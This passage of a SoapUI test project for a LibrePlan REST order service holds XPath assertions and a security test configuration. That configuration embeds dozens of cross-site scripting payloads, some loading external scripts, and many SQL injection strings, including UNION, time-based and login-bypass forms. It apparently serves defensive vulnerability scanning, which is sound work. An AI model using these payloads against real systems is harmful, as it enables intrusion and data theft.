//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:hours-groups[1]/ns1:hours-group[1]/@working-hours</con:path><con:element>@working-hours</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>8</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:hours-groups[1]/ns1:hours-group[1]/@resource-type</con:path><con:element>@resource-type</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>WORKER</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:hours-groups[1]/ns1:hours-group[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0004-0001</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:hours-groups[1]/ns1:hours-group[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:originalMessage><![CDATA[<?xml version="1.0" encoding="UTF-8" standalone="yes"?><order xmlns="http://rest.ws.libreplan.org" calendar-name="Default" dependencies-constraints-have-priority="false" deadline="2022-12-20" init-date="2022-12-05" name="PROJET_TEST1" code="ORDER0002"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><children><order-line deadline="2022-12-15" init-date="2022-12-05" name="Tache1-P1" code="ORDER0002-0003"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><hours-groups><hours-group working-hours="5" resource-type="WORKER" code="ORDER0002-0003-0001"><criterion-requirements/></hours-group></hours-groups></order-line><order-line deadline="2022-12-20" init-date="2022-12-08" name="Tache2-P1" code="ORDER0002-0001"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><hours-groups><hours-group working-hours="10" resource-type="WORKER" code="ORDER0002-0001-0001"><criterion-requirements/></hours-group></hours-groups></order-line><order-line deadline="2022-12-12" init-date="2022-12-05" name="Tache3-P1" code="ORDER0002-0002"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><hours-groups><hours-group working-hours="20" resource-type="WORKER" code="ORDER0002-0002-0001"><criterion-requirements/></hours-group></hours-groups></order-line><order-line deadline="2022-12-20" init-date="2022-12-13" name="Tache4-P1" code="ORDER0002-0004"><labels/><material-assignments/><advance-measurements/><criterion-requirements/><hours-groups><hours-group working-hours="8" resource-type="WORKER" code="ORDER0002-0004-0001"><criterion-requirements/></hours-group></hours-groups></order-line></children></order>]]></con:originalMessage></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Writer</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters><con:entry key="entity-code" value="ORDER0002"/><con:entry key="service-path" value="${Properties#service-path}"/></con:parameters><con:parameterOrder><con:entry>service-path</con:entry><con:entry>entity-code</con:entry></con:parameterOrder><con:environmentSpec><con:entry environmentId="5eadaddc-50e1-41ae-911a-8a2f7c39ffe0"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="e2e9701f-ac19-4e25-a4a0-65eddefe8bd7"><con:authProfile>Reader</con:authProfile></con:entry><con:entry environmentId="d0beedb0-1186-4d88-99b9-78d2322fa1f9"><con:authProfile>Writer</con:authProfile></con:entry></con:environmentSpec></con:restRequest></con:config></con:testStep><con:properties/><con:reportParameters/><con:securityTest id="9adef8e7-997a-41b2-8e1e-835e761c1428" testCaseId="484db76a-c6a2-42ef-a7c2-3e3bc3dd746a" name="Security Test 1" failSecurityTestOnScanErrors="true"><con:settings/><con:testStepSecurityTest><con:testStepId>3c49a7a6-438c-463b-a8c0-490329c9b38d</con:testStepId><con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="218b313a-ffed-4751-af83-3457e72c7a3f" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:assertion type="Sensitive Information Exposure" id="88bc5bc1-1f39-415e-8519-6fb2999d940e" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="78339c07-f96a-4a5e-ba13-fb6c2df94052" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings><con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings><con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings><con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings><con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings><con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings></con:config><con:assertion type="Sensitive Information Exposure" id="a7ae1a17-b7b4-41d8-9a56-f3865787bcda" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="CrosSiteScript" id="4073ba07-23ac-48ee-aae5-ab32883ed1bd" name="Cross Site Scripting Detection"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="bedcc5aa-6a9b-4648-bade-83964c883243" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:minimal>5</con:minimal><con:maximal>15</con:maximal><con:numberOfRequest>100</con:numberOfRequest></con:config><con:assertion type="Sensitive Information Exposure" id="a19b966c-51c9-4576-8796-092102ddddb4" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ALL_AT_ONCE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="3f5d9188-d7a5-4f10-8d1d-6d5a79120a65" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:typesList><con:type>3</con:type><con:value>true</con:value></con:typesList><con:typesList><con:type>4</con:type><con:value>GpM7</con:value></con:typesList><con:typesList><con:type>5</con:type><con:value>0FB7</con:value></con:typesList><con:typesList><con:type>9</con:type><con:value>-1E4f</con:value></con:typesList><con:typesList><con:type>10</con:type><con:value>12.45E+12</con:value></con:typesList><con:typesList><con:type>11</con:type><con:value>-1.23</con:value></con:typesList><con:typesList><con:type>12</con:type><con:value>SoapUI is	 the&#13; best
</con:value></con:typesList><con:typesList><con:type>13</con:type><con:value>P1Y2M3DT10H30M12.3S</con:value></con:typesList><con:typesList><con:type>14</con:type><con:value>1999-05-31T13:20:00.000-05:00</con:value></con:typesList><con:typesList><con:type>16</con:type><con:value>1999-05-31</con:value></con:typesList><con:typesList><con:type>22</con:type><con:value>-1267896799</con:value></con:typesList><con:typesList><con:type>23</con:type><con:value>-882223334991111111</con:value></con:typesList><con:typesList><con:type>24</con:type><con:value>-2147483647</con:value></con:typesList><con:typesList><con:type>25</con:type><con:value>-32768</con:value></con:typesList><con:typesList><con:type>26</con:type><con:value>127</con:value></con:typesList><con:typesList><con:type>27</con:type><con:value>0</con:value></con:typesList><con:typesList><con:type>28</con:type><con:value>-1</con:value></con:typesList><con:typesList><con:type>29</con:type><con:value>1</con:value></con:typesList><con:typesList><con:type>30</con:type><con:value>1267896799</con:value></con:typesList><con:typesList><con:type>31</con:type><con:value>882223334991111111</con:value></con:typesList><con:typesList><con:type>32</con:type><con:value>294967295</con:value></con:typesList><con:typesList><con:type>33</con:type><con:value>65535</con:value></con:typesList><con:typesList><con:type>34</con:type><con:value>255</con:value></con:typesList><con:typesList><con:type>35</con:type><con:value>SoapUI is the best</con:value></con:typesList><con:typesList><con:type>36</con:type><con:value>SoapUI is the best</con:value></con:typesList></con:config><con:assertion type="Sensitive Information Exposure" id="892bf581-304b-4b86-8f92-b1533d149d18" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="296134fc-d8c5-4be6-b40d-c14ca19f6d13" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:sqlInjectionStrings>'-'</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,2,1))='i'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 4-- </con:sqlInjectionStrings><con:sqlInjectionStrings>benchmark(50000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>' or ''&amp;'</con:sqlInjectionStrings><con:sqlInjectionStrings>'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings><con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 20 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>waitfor delay '00:00:05'#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin"or 1=1 or ""="</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or ("1"="1"/*</con:sqlInjectionStrings><con:sqlInjectionStrings>"</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or '1'='1'#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=0-- </con:sqlInjectionStrings><con:sqlInjectionStrings>#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings><con:sqlInjectionStrings>%</con:sqlInjectionStrings><con:sqlInjectionStrings>'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--</con:sqlInjectionStrings><con:sqlInjectionStrings>+benchmark(3200,SHA1(1))+'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--</con:sqlInjectionStrings><con:sqlInjectionStrings>+</con:sqlInjectionStrings><con:sqlInjectionStrings>,</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 21 </con:sqlInjectionStrings><con:sqlInjectionStrings>/</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 13# </con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,3,1))='S'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 22-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings><con:sqlInjectionStrings>;</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings><con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 